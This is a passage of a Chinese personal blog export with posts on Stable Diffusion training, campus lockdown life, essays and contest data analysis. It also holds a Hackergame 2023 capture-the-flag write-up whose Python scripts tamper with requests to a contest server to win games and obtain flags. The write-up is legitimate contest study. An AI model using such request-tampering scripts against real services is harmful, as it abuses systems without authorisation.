提供的示例脚本:\nhttps://github.com/huggingface/diffusers/tree/main/examples\n对于略微有点 neural network 知识的人都可以上手。 此外还有面向新手的 HCP-Diffusion 值得推荐，照着它给的 example yaml 改改就能跑。 相对于 diffusers 和 hcpdiff，sd-scripts 是对 diffusers 的脚本进行的拓展，但是提供的脚本复杂难以配置，不建议使用。不过 基于 sd-scripts 的 GUI 可以考虑使用。\nSD 模型结构 一个 SD 模型组成:\nFeatureExtractor (safety checker 专用) Tokenizer, TextEncoder (text) Scheduler (add noise) UNet (denoise) VAE (Variant Auto Encoder) 上面的部件中除了 UNet，其余都是预训练的。 FeatureExtractor, TextEncoder 这些是通用型权重，就和从 resnet 独立出 feature extractor 一个道理。\nVAE 也是预训练的，但是有很多人会误解它的方法和作用。 网上查不到具体训练方法，论文里讲的也不多，在 G. Details on Autoencoder Models 那一部分。 我的猜测是和 AE 差不多，img -\u0026gt; latents -\u0026gt; img 的自监督训练。其中的 latents 和 embeddings 有异曲同工之处，区别在于 latents 作为模型输入，有具体形状，embeddings 作为上下文嵌入，一般是 linear features。 VAE 的 encoder 可以实现 img2img 的效果，下面会具体讲讲。\nVAE 细节：源码里的 VAE encoder 输出是 8 维的，会使用一个叫做 DiagonalGaussianDistribution 的模型进行变分处理（大概是为了增强重建能力），同时这个变分模型也提供了合并方法输出 4 维，再输入到 UNet。\n这里是我根据 diffusers 文档实现的完整 pipeline: https://github.com/iyume/diffusers-test/blob/main/tours/diffusers_tour_pipeline_depart.py\ntext-to-image tokenize prompt 根据 tokens 和 textual inversion weights 进行 token -\u0026gt; vectors 映射 创建一个长度相同的 uncond_embeddings 并 concat 进去（N+1），旨在使用 CFG Scale (guidance_scale) 控制结果与 prompt 的贴合程度 创建噪声图，scheduler 循环 timestep 调用 UNet 降噪，embedding 在 UNet 内部处理 UNet 有个 time embedding 我没看懂，不知道为什么要将 text embedding 转换为 time embedding。参照 1 2 3\nimage-to-image 利用 VAE encoder 将图像编码为 latents 根据 step 和 strength 调用 scheduler 对 latents 增加噪声 scheduler 循环 timestep 调用 UNet 降噪，有 prompt 的话就载入 text embedding Context Embeddings Context Embeddings 是 Stable diffusion 模型里面一个非常重要的设计，用于接受各种各样的输入，如文本、图像、音乐、语音。 embeddings 并不是多模态，它们有着重要的区别：Stable diffusion 只能接受单一种类的 embedding，除非使用 adapter 模型对各种潜在空间进行相互转换。\n具体的嵌入方法就是 Attention 注意力机制。 Attention 是一个单独的层，大部分有着独立的权重，用于改变输出，一般不影响输出的尺寸。\n就我个人经验而言，在传统的 CNN 领域里，Attention 一般分为 Channel Attention 和 Spatial Attention，根据维度的不同，计算方差或者其他类似的值，加到结果内。\n在 Stable diffusion 则是一个叫做 Transformer2DModel 的模型，比较复杂没细看。\n训练方法 基于 RTX 4060 Laptop 8G 测试，只跑得动 textual inversion 和 lora，所以只对这两个训练方法做介绍。\n训练图片采用的是 16 张从 TV 截图的波奇酱的图片，每两张在 anythingv5 模型上做了 img2img 风格化处理（对于 lora 似乎影响不大），所以眼睛会略微偏蓝。\nTextual Inversion 文本反转，即不是通过改变权重来改变模型效果，而是通过改变输入来改变输出。\n训练 textual inversion 时，通过创建一个 tokenizer 不认识的 token，映射至对应的向量，这个向量长度可以由 num_vectors 控制。 向量长度越大，输出的权重文件也就越大，一般 32 vectors 对应 97 kb。\n在 tokenizer 中，一个 word 是有可能对应多个 token 的，比如 girls 会被拆分为 girl, s\n**结果评价：**训练时间 1 小时。97 KB (32 vectors)。 完全无法训练姿态，只会扭曲模型效果（姿态有关的都只能采用 ControlNet 和 openpose）。动漫人物的发饰、呆毛、眼球等细节完全无法还原，容易产生撕裂现象，还有模糊不清。大概只能训练结合模型已有的物品。非常容易破坏模型风格。\n综上，Textual Inversion 是一个很黑盒很 DNN 的操作，大炼丹师或许可以得到非常小的权重和非常完美的结果，或者是大魔法师配合优秀的 prompt 也能得到不错的结果，但是不建议使用这个训练方法。\n下图是使用单 keyword (gotou_hitori) 不搭配任何 prompt 生成的图像：\n下图是使用 keyword 搭配 prompt 生成的图像：\n使用了类似 [[gotou_hitori:0.2]::0.8] 的 prompt 魔法。\ntext-to-image 最原始的方法，旨在训练整个 UNet。\n对降噪误差做 backward，比如 DDIM 有 50 timestep，对 20 至 21 的降噪步骤相减并 backward。\n我这里只用了 text-to-image lora 脚本，没有记录训练时间，但是我记得和 textual inversion 的训练时长差不多，且模型效果比 textual inversion 还差，大概率是因为数据集不完善。diffusers 的官方脚本没更新，只能用它老一套的 datasets 载入，比较麻烦。\n评价为不好用，要求数据集完善，可以被 dreambooth 完美取代。\nDreambooth 参照官方的 Dreambooth 讲解。 Dreambooth 也是训练整个 UNet 的方法，但是速度快，要求数据集小。\n我这里只训练了 dreambooth lora 脚本。训练的关键参数是 rank，类似于 textual inversion 中的 num_vectors。 rank 越高表示控制的维度越深，同时权重文件也会越大，也更容易过拟合。\n防止过拟合的方法最简单的就是用 tensorboard 看看每一百步生成的测试图像。\n**结果评价：**训练时间 10 分钟，可以关掉 validation。3 MB (rank 1)。 对动漫人物的学习（建议 rank\u0026gt;10）可以达到略胜于 Textual Inversion 的效果，主要是不容易影响模型自带的风格，模型兼容性也比 TI 更好。但对于波奇酱的方块发饰则很难达到好的效果，生成出来要么是圆的，要么一大一小，只有极小概率会生成出不错的发饰。\n参考生成图：\n第一张的效果最佳，不过呆毛偏上了点。相比于 TI 来说，lora 不需要搭配太多 prompt，只要 \u0026lt;lora:gotou_hitori\u0026gt; 载入 lora 即可达到不错的效果。\n高清生成 最后放一张使用 anime6k 配合 prompt 咒语生成的高清图：\n里面应该是包含了 generation data 的。话说现在居然还没有一个便利的查看/修改 generation data 的工具，打算自己写一个了。\n笔记 随手记的一个笔记\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 CFG Scale(classifier-free guidance): 提示词和生成图像的贴合程度 Outpainting: 向外延展画布 Inpainting: 修复图像内部空缺 Color Sketch: 为素描画填充颜色 Prompt Matrix: 提示词矩阵，用 | 分割提示词的排列组合进行扩散 Pormpt S/R: 提示词 Search/Replace，搜索替换并矩阵扩散 Prompt Editing: [from:to:when] 控制每次 inference step 的 prompt (()) 给予更多权重，(word:1.111) 权重分配 X/Y/Z plot: 同 X/Y plot，根据不同输入参数（提示词，CFG scale，step 等）创建输出矩阵 Textual Inversion: 将特定提示词和相关图像嵌入模型进行训练 Tiling: 将图像周期平铺放大分辨率，比如把花的数量增加 Styles: 保存常用提示词 Variations: 图像微调，与 img2img 不同在于，微调的提示词是可选的，构图通常有很大变化 High-res fix: 防止生成高分辨率（大于 512x512）时出现图像扭曲，在生成 512x512 时设置 upscale 参数 1.5 则输出 768x768，step 设置为 0 时会使用 sampling step 的值 Upscaling: 将图像进行放大 Alternating Words: 交叉使用不同的 prompt，是 Prompt Editing 的自动版 tcmalloc: 对显存分配提升巨大，见 https://github.com/AUTOMATIC1111/stable-diffusion-webui/discussions/6722 将 generation data 粘贴到 prompt 然后点击 \u0026#34;Generate\u0026#34; 下方第一个蓝色按钮即可自动应用参数 https://www.youtube.com/watch?v=dVjMiJsuR5o Dreambooth: 训练整个模型最有效的方法，也只能训练整个模型，占用空间大 Textual Inversion: 在 text encoder 进行训练，对某种特定的单词创建特定的 embeddings (vector) 再输入模型，只改变描述，不改变模型效果 LoRA: 在模型中插入低秩权重，对这个权重进行训练，同时会减慢生成速度，数个 LoRA 可以同时使用，但很容易过拟合（容易记住数据集） Tricks: (1) num_train_epochs = max_steps * batch_size / len(train_dataloader) max_steps = num_train_epochs * len(train_dataloader) / batch_size 假如有 14 张训练图片，此时 len(train_dataloader)=1400，则 epochs = max_steps * 4 / 1400，max_steps=1050 时 epochs=3，max_steps=1051 时 epochs=4 (2) Inpainting Mask blur 是进行高斯模糊的参数，0 代表完全改变，越高代表越少的改变 (3) [[gotou_hitori:0.2]::0.8] add gotou_hitori from 0.2 to 0.8 后记 Stable diffusion 太强了，生成美少女也很好玩，源码太复杂没能全部读完，将来要是有兴趣了再读吧。\n虽然我对 AI 感兴趣，从最开始的 CS231n 到后面发论文，期间读了很多 segmentation(deeplabv3,bisenetv2,unet)、fusion(多尺度、曝光、聚焦等各种融合) 等领域的优秀论文，也从中学了很多。 但我毕竟是个末流一本，也不是搞算法和数学原理的，对我而言沉没成本很大。 AI 我是打算只当作兴趣学学的。Web3 也差不多，后面可能会写一篇介绍 go-ethereum 的文章。\n之前居然还有一个人开了 issue 和我讨论，挺惊讶的：https://github.com/iyume/image-fusion/issues/2\n文章花了一整天的时间来写，太久没写文章感觉很生疏。\n","date":"2023-11-18T20:10:47+08:00","permalink":"https://blog.tinyume.com/2023/stable-diffusion-tips/","title":"Stable diffusion 笔记"},{"content":"只玩了两个钟，800 分，所以也只能随便写个 wp。\nHackergame 启动 改 query 参数即可。\n更深更暗 js 里有一段生成 flag 的代码，直接提取调用即可。\n赛博井字棋 比赛中没做出来，后来知道了是可以下在 AI 下过的地方。\n下面是一段脚本（完赛后才完善的脚本）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import requests URL = \u0026#34;http://202.38.93.111:10077/\u0026#34; TOKEN = \u0026#34;your token\u0026#34; session = requests.session() session.get(URL, params={\u0026#34;token\u0026#34;: TOKEN}) session.headers[\u0026#34;Content-Type\u0026#34;] = \u0026#34;application/json\u0026#34; session.post(URL, json={\u0026#34;act\u0026#34;: \u0026#34;reset\u0026#34;}) resp = session.post(URL, json={\u0026#34;act\u0026#34;: \u0026#34;getBoard\u0026#34;}) print(\u0026#34;board:\u0026#34;, resp.json()) resp = session.post(URL, json={\u0026#34;x\u0026#34;: 0, \u0026#34;y\u0026#34;: 0}) print(\u0026#34;board:\u0026#34;, resp.json()) resp = session.post(URL, json={\u0026#34;x\u0026#34;: 1, \u0026#34;y\u0026#34;: 1}) print(\u0026#34;board:\u0026#34;, resp.json()) resp = session.post(URL, json={\u0026#34;x\u0026#34;: 2, \u0026#34;y\u0026#34;: 2}) print(\u0026#34;board:\u0026#34;, resp.json()) 需要注意的是每次 post 都会导致 session 变化，所以不能直接使用 session 容易使 set-cookie 无效，使用 token 获取 session 即可。\n组委会模拟器 调 f12 看网络请求，大体逻辑梳理一下，写出了下面脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 import httpx import asyncio import datetime import time import re async def delete( session: httpx.AsyncClient, msg_id: int, delay: float ) -\u0026gt; httpx.Response: await asyncio.sleep(delay) return await session.post( \u0026#34;/api/deleteMessage\u0026#34;, json={\u0026#34;id\u0026#34;: msg_id}, headers={\u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;}, ) async def main(): session = httpx.AsyncClient() # session.get(URL, params={\u0026#34;token\u0026#34;: TOKEN}) session.cookies.set( \u0026#34;session\u0026#34;, \u0026#34;your session\u0026#34;, ) session.base_url = \u0026#34;http://202.38.93.111:10021\u0026#34; resp = await session.post(\u0026#34;/api/getMessages\u0026#34;) if resp.status_code != 200: raise RuntimeError messages = resp.json() messages, server_st = ( messages[\u0026#34;messages\u0026#34;], datetime.datetime.fromisoformat(messages[\u0026#34;server_starttime\u0026#34;]), ) server_st = server_st.replace(tzinfo=None) start_delay = (server_st - datetime.datetime.utcnow()).total_seconds() print(\u0026#34;delaying\u0026#34;, start_delay) time.sleep(start_delay + 0.5) deleting_tasks: set[asyncio.Task[httpx.Response]] = set() async with asyncio.TaskGroup() as tg: for msg_id, msg in enumerate(messages): if re.search(r\u0026#34;hack\\[[a-z]*\\]\u0026#34;, msg[\u0026#34;text\u0026#34;]): task = tg.create_task(delete(session, msg_id, msg[\u0026#34;delay\u0026#34;])) deleting_tasks.add(task) done = True for task in deleting_tasks: res = task.result().json() if not res[\u0026#34;success\u0026#34;]: print(res[\u0026#34;error\u0026#34;]) done = False if done: resp = await session.post(\u0026#34;/api/getflag\u0026#34;) print(resp.json()) asyncio.run(main()) 我写的这个脚本应该是全网最完善的了，根据 server_time 开始计算，异步请求。\nGit? Git! 熟悉 git 的人都知道有悬空 commit，用 git fsck --lost-found 命令查看就可以了，然后 checkout 在工作区里面 find 一下就可以看到 flag。\nOthers 还有其他一些小题，我就不写了。\nblockchain 虽然我也有所研究，但是对 solidity 研究不深，涉及 ERC 和各种安全合约真的很复杂，所以基本没看。\n后记 hugo 终于添加了 timeZone support，再也不用 --buildFuture 了，终于舒服了。\n","date":"2023-11-04T17:11:00+08:00","permalink":"https://blog.tinyume.com/2023/hackergame-2023/","title":"Hackergame 2023"},{"content":"2022 年 3 月初，吉林爆发了一场本土聚集性疫情。 这是维基百科的介绍。\n由于维基百科的介绍已经足够详细，该有的有了，没有的也有了。 在这里我只记录一下我们学校发生的事情。\n2 月底返校时，由于担心深圳疫情变动，我把 2 月 27 号的返校机票改签提前至 2 月 25 号，也正是因为这个“误打误撞”的改签，我才得以进入校园。 因为正好在 2 月 27 号，深圳龙华区发出了疫情通知，等了一天的入校批准后，我也正好是 2 月 27 号下午进入校园。而 2 月 28 号后从龙华区返校的人都被送进了隔离楼。\n直到 3 月 11 号的这段时间，校园内还是一切正常，大家自由走动，按时上课。 3 月 6 号有数人翻墙被抓了，通告了严重处分。那时候长春还没有疫情，学校管得有点过分。 3 月 11 号学校宣布隔离 3 天。疫情蔓延到长春来大概是 3 月 13 号，日记里记载那天正好下了场应景的雪。 随后进入了无期限的隔离。\n直到 4 月 22 号，这一天没有新增。期间一个半月没有厕所自由，也没得洗澡。 但是无新增 != 学校会让你洗澡。外面已经逐渐放开了，学校还在严格管控。\n后来过了几天，学校发了“洗澡通行证”，一人用一次。宿舍楼逐渐有了厕所自由。 甚至有了两小时的下楼活动时间。学校真是太慷慨辣。\n5 月 3 号，学校通知大家回家。大多数人在 7 号前都走了。 因为我不想回家，所以我是 5 月 12 号走的。学校还让留校的人搬到一起，我实在想不出除了省钱还有什么别的作用，于是我就回家了。实际上包括不在学校的人，住宿费都没退。\n从返校隔离算起，隔离时长两个半月。从宿舍隔离算起，隔离时长两个月。 期间，身体卫生，我都是凌晨出来清洗的，洗头发，擦擦身体，凌晨也经常不止我一个人。 至于物资，前一个月还行，严重迟到送饭也没什么大碍，后来就越来越少，到最后就裸盒饭了。\n下半年开学 9 月 20 日，学校宣布第一批学生返校，我是 22 号晚上到的学校，被通知“静默管理”。 在宿舍隔离两周后，才允许在校园内活动和取快递。\n直到 10 月 30 号，也就是文章发布的这一天，整整一个多月，长春市没有新增确诊，有少数无症状和境外输入，但不值一提。\n即便如此，学校和老师都给出了明确的态度：「这学期大概率不能出校」，翻译过来就是不想放你们出校。\n但从最开始，教职工就可以随意出入校园。校园内在施工不明建筑，也有很多外来的工人进出校园。知乎上有网友对此现象称为——「半透膜」。\n那么，长春市有多少所学校是这样的呢？据我所知，吉林大学、长春理工大学、吉林艺术学院综合校区处于封闭状态，吉林艺术学院主校区处于开放状态。\n另外，校内每日核酸持续到了 10 月 24 号，目前两天一检。从排队的时刻算起，核酸有时候要排半个钟的队，志愿者也都是从各班轮流抓的。\n说在最后 文章记录的内容和准确日期，大多数是我的日记。\n文章不含观点。仁者见仁，智者见智吧。\n今年 hackergame 没啥心情看，所以不会写 write-up。\n补充 忘了说了，我在 10 月 26 号给国务院发了投诉信，不过直到 11 月 8 号还没有任何回应，可能国务院处理比较慢？\n这是原信——\n标题：长春理工大学开学后封校一个月，教职工自由出入\n在长春本土疫情无新增的情况下，长春理工大学封校一个月，不允许取外卖，不允许任何理由出校。在严格封闭学生的同时，教职工却每日照常出入校园，并且有校外人士入校。这是无理由的封校行为。\n据悉，吉林大学和吉林艺术大学也存在同样的封校情况。\n在此，我要求恢复大学生出校自由。\n我采取了行动，并且用的是我自己的账号。 我不觉得现状能因为我的一封信能有所改变，并且还要承担被学校请喝茶的风险。 我也会在想，是不是大家都发信投诉，现状就能有所改变呢。 我会期待大家都为自己的自由作斗争，但假如没有人站出来，那我会尽力做出自己的一点努力。\n敢于抗争吧，处在青春的少年少女们！\n趣事 年初的时候便起草了这篇文章，那时候还在炼丹。文章的英文名叫做 2022-ncov，我在打出 nCoV 的时候还想了半天是 Conv 还是 nCoV，炼丹炼到满脑子都是 Conv。\n","date":"2022-10-30T20:34:12+08:00","permalink":"https://blog.tinyume.com/2022/2022-ncov/","title":"吉林 3 月疫情"},{"content":"美和自由 自由，并不意味着开放和快乐。关于自由的标准有很多，但大致可以分为如下两点：\n选择自由，所谓选择自由用一句话概括就是「我想要做那件事，但我有权利决定做不做，受压迫了我就不爽」。选择自由也是存在主义的核心之一，对于积极唯物主义来说，即使你可以选择逃避一件事，但勇敢站出来对抗它也是一个选择，也是一种英雄主义。\n服从自由，意识形态固化、常识容易被言论误导的人只会倾向于听从自己心中的「神」，即使发生了什么不对劲的事情也不会抗议，因为他们的常识会潜移默化地接受这种变化，对于他们来说，专制和极权也何尝不是自由呢。\n我想说的是，自由的判断很大程度上是美的判断。人所能见到美的东西，就会认为是自由的。 美和常识是密切相关的，假如你看到有人在大马路上拉屎，那显然就是违背常识的。 我们对事物美的判断是非常主观的，你写的诗，别人不一定欣赏得来，所以我们说诗是美的，不写诗的人就会认为诗没什么美感可言。 一个人能看到越多事物的美丑和两面性，他就越清楚美是什么样的，他的常识判断就越清晰，他就越清楚道德标准在哪里，他也因此更自由。 相反，一个人从小就不知道什么是常识，不知道怎么自己判断真相，他也就越容易受舆论影响、受权威影响。\n美是主观的，自由的人拥有对美的高度追求，所以自由的人往往都是痛苦的。\n文学会教人认识美的方法。从技术圈也认识到类似的一点就是，能够熟练使用 Google 搜索引擎的人、找文档自力更生的人，就已经具备大多数人不具备的「常识」了。\n写给米米：有清晰常识判断的一个人，往往能下意识地说出来自己是喜欢还是讨厌这个事物，而不是犹豫着自己到底要说些什么。对于基本常识还要犹豫很久才能做出判断的人，一般叫做猪，一头有交流障碍的猪。\n做了什么 由于长春疫情，提前返家后的暑假有足足 4 个月，在家里呆着真折磨，我讨厌自己家——家家有本难念的经。这 4 个月假期我几乎什么都没干，直到回了学校，心情变好了很多，才开始忙着写一些代码。\n论文 年初时，也就是疫情那段时间（疫情会单独讲一篇文章），完成了大创。 因为需要提交论文，整个过程可谓是折磨——学长 leader 和导师不仅喜欢 push 人，也把整个小组当提线人偶使用，上课、写作业、定期交作业。 我现在只能无奈地说，我不介意队员啥都不会，我可以教，我学他们也学，但是导师还得是关系比较好的而且有水平的。 最后是我一个人想的方法，也是一个人写完的代码，包括所有图片测试和指标绘图。 代码地址。 其实 README 的描述和我们组写的论文还有很大不同，我有在努力解释代码到底是如何工作的，但是 leader 自顾自的解释，看到比我们高的评价指标就删掉，我也很无语。 中间还有很多细节没有讲。总之我对学术界彻底失去了兴趣，也不想去任何一个实验室了。\n我整个过程的感受就如同这篇文章所说: https://survivesjtu.gitbook.io/survivesjtumanual/fang-tan-ji/xiao-xin-xiang-mu-de-xian-jing\nCPython 今年 7 月份到现在的这段时间里给 cpython 提交了一些 fix 和 enhancement 和对应的测试，成为了 cpython contributor。 如果早点的话，我还能拿个 github 火星车徽章！不过能成为 contributor 已经很开心了。 在修 typing 标准库时 (#96080)，有幸和 python 之父 Guido 进行了一段交流。\n个人项目 Python API 文档生成器 是我从去年暑假写到今年现在，即使中间经常空着时间没写，但也是写的时间最长、复杂度最高的一个项目了。 主要是对 v0.1.x 的改进，v1 目前还只完成了 1/3 的样子，已经有 2000 行了。 项目唯一能参考的就是一些 linter，比如 mypy 和 jedi，看完不太可能，只看了一些设计方法和一些函数组件。 至于 pdoc 和 sphinx 完全就是残废。 我感觉写 nb-autodoc 时不是在写代码，更像是在写协议——我需要构建每个模块和对象的定义，才能进行准确的分析，在兼顾对象关系的同时输出完整的文档。\n果冻 最近买了果冻，甜甜的，即使没有甜品那么好吃，也不错。因为只有外面可以吃到甜品。不久的将来，也许果冻会代替甜品也说不定呢（笑）\n","date":"2022-10-19T15:03:04+08:00","permalink":"https://blog.tinyume.com/2022/no-sense-bypass/","title":"自由、美、我的日程和果冻"},{"content":"虽然我清楚纠结一字一句的过程是与自己对话的过程，但似乎也需要看时期。\n日记姑且还是有在记，虽然不是每天，我觉得这还是挺重要的。 对于是否要写一种日记式的博文，我也在纠结中。 似乎我做不到像某些我认识的人那样公布一些日记似的东西出来。 比起在网上交流他们，我更喜欢和我认识的朋友们交流。 虽然我也乐于让别人知道我自己。嘛。\n形而上学有什么用呢？答案是没有。对我来说它只是一种抑制不住的好奇和爱。 虽然我的日常没有什么重大的忧虑，偶尔我还是会感到一些痛苦。 所幸我的世界不再需要围绕任何人打转了。\n还有给老师的回信还没写，也是用不了两个钟的信；我最近也是一直拖着、约定的见面也因为疫情不了了之 qwq\n3 月 20 号左右更新了 https://tinyume.com/ 这个页面。 主要原因是被阿里云提醒我这个页面没有加备案号也不在国内主机。 于是直接糊了个 html 挂在学生机上，因为东西比较少所以直接写了英文。\n此前学生机除了 frp、qqbot、notebook 外没啥别的用处，就干脆重装了。 换上了 conda + jupyterlab，体验感还是很不错的。 ipykernel 这东西真神奇，直接调用的 python 总是来自默认 kernel 的。 !python -m site 看不到其他 kernel 的模块搜索路径，调用 os 也看不到。 内部似乎是 ws 实现的跨环境访问，不过居然连 python 版本都能跨。\n炼丹时才发现自己笔记本的固态太小了都不够用，因为是 GPT 分区所以我还会经常拿 DG 来划空间（比较喜欢分区管理数据）。 还有显卡这个问题以后买笔记本可能也需要注意一下了。 换了 conda 其实也解决不了多环境浪费空间的问题，但是切换 python 版本还是比较方便的。 甚至可以环境内直接 install（）\n长春这边疫情目前还是很严重，目前隔离了两个星期。也是异地恋了三个月，当初寒假结束本来约定见面了却疫情爆发没办法。 不过异地恋对于我来说，从中学到了很多东西是一点，当然很多东西一言两语没法讲完，这篇博文本来也是随便写点。 还有就是做到了很多人没法达成的关系吧，让我感觉很开心。甚至异地恋的三个月每天也都很开心。\n最近在写基于 denseblock 的 image fusion approach（仿）。 空闲时间还写了个 nonebot-plugin-wordle，后面看下能不能研究下信息论那个 solver。\n","date":"2022-03-22T12:38:42+08:00","permalink":"https://blog.tinyume.com/2022/sidenote-i-dont-want-writing/","title":"生活小记 1"},{"content":"比赛时间 第一阶段: 北京时间 2021 年 4 月 8 日下午 20:00 时 —— 4 月 11 日下午 20:00 时\n第二阶段: 北京时间 2021 年 5 月 13 日下午 20:00 时 —— 5 月 16 日下午 20:00 时\n成绩 第一阶段\n分数: 50\n排名: 1608 / 2878\n简短评语: 模型分析过程不错\n第二阶段\n没参加\nPreface 第一次参加这个挑战赛时还是高二（见这篇博文），那时候写的代码挺垃圾的。不过当时一、二阶段的赛题算是勉强完成了。\n2020 届挑战赛没去，因为要大家都要高考。\n今年年初，以前组队的朋友问我要不要再来玩玩，我想着可以提高数据分析能力，于是就尝试了一下。\n今年的这次挑战赛，第一阶段的分数没有第一次打的高，第二阶段的题目也没有思绪。跨校组队嘛，会有种种不便。不过模型分析的思路挺清晰，代码写得也很规整，学习到了很多知识，尤其是坐标型数据分析。\n主要问题还是老样子，就是数学理论知识太少。\n于是就干脆当数据分析玩玩算了，然后我就狂搓代码，能想到的特征图全做出来。\n源码有三百行，贴出来也不太好，我讲些重点的代码吧。\n数据处理 先来看看样本数据（CSV）\n1 2 3 4 5 6 7 timestamp,latitude,longitude,total_cars,carsList 2019-01-10 11:45:55.070781 UTC,32.09995,34.78794,1,[182] 2019-01-10 11:45:55.070781 UTC,32.06567,34.79612,1,[268] 2019-01-10 11:45:55.070781 UTC,32.06465,34.80322,1,[106] 2019-01-10 11:45:55.070781 UTC,32.05978,34.81034,1,[180] 2019-01-10 11:45:55.070781 UTC,32.05133,34.75089,1,[16] 2019-01-10 11:45:55.070781 UTC,32.04223,34.7742,1,[72] 一共有 1048575 条数据，时间、经纬度都包含在内。\nformat 就很简单，把 list eval 转化一下，然后时间就 strptime，做一些 describe 看看数据有没有偏差，为预处理做准备。\n预处理 包含了时间序列的预处理和经纬度区间的预处理，划定区间就行了，别的不合理数据暂时看不出来。\n时间序列 Groupby 由于每一周为一个周期，因此把时间序列划分在以周为单位。\n1 2 3 4 5 6 7 8 9 10 11 groupby_hour = df[[\u0026#39;timestamp\u0026#39;, \u0026#39;total_cars\u0026#39;, \u0026#39;latitude\u0026#39;, \u0026#39;longitude\u0026#39;]].groupby( [ df.timestamp.map(lambda x: x.year), df.timestamp.map(lambda x: x.month), df.timestamp.map(lambda x: x.day), df.timestamp.map(lambda x: x.hour) ] ).sum() groupby_hour[\u0026#39;datetime\u0026#39;] = list(map(lambda x: datetime(*groupby_hour.iloc[x].name), range(len(groupby_hour)))) groupby_hour.set_index(groupby_hour.datetime, inplace=True) groupby_hour = groupby_hour.resample(\u0026#39;H\u0026#39;).first().fillna(0) 然后可以根据划出来的时间序列为接下来的工作做一些准备。比如:\n1 2 3 4 5 time_gap = timedelta(days=6, hours=23, minutes=59) # not days 7 because slice will select the end of time for unknown reason d = { f\u0026#39;week{i + 1}\u0026#39;: groupby_hour[\u0026#39;total_cars\u0026#39;][datetime(2018, 12, 12) + i * time_gap : datetime(2018, 12, 19) + i * time_gap] for i in range(4) } 时间序列归类描述 对 2018-12-12 到 2019-01-08 共 28 天三星期每间隔 7 天的流量进行相似分析\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 fig, ax = plt.subplots(4, 1, sharex=False, sharey=True, figsize=(15, 40)) fig.set_facecolor(\u0026#39;white\u0026#39;) for i in range(4): time_gap = timedelta(days=7) ax[i].set_title(f\u0026#34;{datetime(2018, 12, 12) + i * time_gap : %F} to {datetime(2018, 12, 19) + i * time_gap : %F} traffic analysis\u0026#34;) ax[i].set_xlabel(\u0026#39;hour\u0026#39;) ax[i].set_ylabel(\u0026#39;cars sum\u0026#39;) ax[i].set_ylim([200, 1400]) x_array = list(range(24)) label_extra_list = [\u0026#39;Wed\u0026#39;, \u0026#39;Thur\u0026#39;, \u0026#39;Fri\u0026#39;, \u0026#39;Sat\u0026#39;, \u0026#39;Sun\u0026#39;, \u0026#39;Mon\u0026#39;, \u0026#39;Tue\u0026#39;] for i in range(4): week = d[f\u0026#39;week{i + 1}\u0026#39;] for j in range(7): ax[i].plot( x_array, week.iloc[j * 24 : (j + 1) * 24].values, label=f\u0026#39;{week.iloc[[j * 24]].index[0] : %F}\u0026#39; ) ax[i].legend() fig.savefig(\u0026#39;./2018-12-12|2018-12-19 7天的流量进行相似分析\u0026#39;, dpi=200, bbox_inches=\u0026#39;tight\u0026#39;) 还有各种时间序列的分析，就不写了。\n坐标型归类描述 也就是画热力图，方法得自己搓，有个专门做热力图的三方库不过我没用过。\n这里实现原理就是把车辆作为权重，然后把经纬度根据设定的单位长度化为二维数据。\n这是第一种算法实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 fig, ax = plt.subplots(1, 1, sharex=False, sharey=False, figsize=(15, 10)) fig.set_facecolor(\u0026#39;white\u0026#39;) ax.set_title(\u0026#39;cutted position block\u0026#39;) ax.set_xlabel(\u0026#39;longitude\u0026#39;) ax.set_ylabel(\u0026#39;latitude\u0026#39;) step = 0.01 x_index = [f\u0026#34;{i + step / 2:.3f}\u0026#34; for i in cutinto_longitude[:-1]] y_index = [f\u0026#34;{i + step / 2:.3f}\u0026#34; for i in cutinto_latitude[:-1]] ax.scatter([i for i in x_index for _ in range(len(y_index))], y_index * len(x_index), s=groups_positions, alpha=0.5) plt.savefig(\u0026#39;总数据热力图\u0026#39;, dpi=200, bbox_inches=\u0026#39;tight\u0026#39;) 坐标和时间关联描述 把坐标区域划分好，然后取一天内某个时间段，专门分析这段时间的车辆状况。\n如果想提高数据可靠性，就把每周的数据合并统计绘图。（事实上这么做是必要的，因为一两周的数据量太少了）\n可以分析出七天每天在某个固定时间段的流量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 label_extra_list = [\u0026#39;Wed\u0026#39;, \u0026#39;Thur\u0026#39;, \u0026#39;Fri\u0026#39;, \u0026#39;Sat\u0026#39;, \u0026#39;Sun\u0026#39;, \u0026#39;Mon\u0026#39;, \u0026#39;Tue\u0026#39;] highly_range1 = (4, 7) groups_positions_common_sumweek = { v: pd.concat([ df[(df.timestamp \u0026gt; datetime(2018, 12, 12, highly_range1[0]) + timedelta(days=i)) \u0026amp; (df.timestamp \u0026lt; datetime(2018, 12, 12, highly_range1[1]) + timedelta(days=i))][[\u0026#39;latbin\u0026#39;, \u0026#39;lonbin\u0026#39;, \u0026#39;total_cars\u0026#39;]], df[(df.timestamp \u0026gt; datetime(2018, 12, 19, highly_range1[0]) + timedelta(days=i)) \u0026amp; (df.timestamp \u0026lt; datetime(2018, 12, 19, highly_range1[1]) + timedelta(days=i))][[\u0026#39;latbin\u0026#39;, \u0026#39;lonbin\u0026#39;, \u0026#39;total_cars\u0026#39;]], df[(df.timestamp \u0026gt; datetime(2018, 12, 26, highly_range1[0]) + timedelta(days=i)) \u0026amp; (df.timestamp \u0026lt; datetime(2018, 12, 26, highly_range1[1]) + timedelta(days=i))][[\u0026#39;latbin\u0026#39;, \u0026#39;lonbin\u0026#39;, \u0026#39;total_cars\u0026#39;]], df[(df.timestamp \u0026gt; datetime(2019, 1, 2, highly_range1[0]) + timedelta(days=i)) \u0026amp; (df.timestamp \u0026lt; datetime(2019, 1, 2, highly_range1[1]) + timedelta(days=i))][[\u0026#39;latbin\u0026#39;, \u0026#39;lonbin\u0026#39;, \u0026#39;total_cars\u0026#39;]] ]).groupby([\u0026#39;lonbin\u0026#39;, \u0026#39;latbin\u0026#39;]).sum() for i, v in enumerate(label_extra_list) } for i in 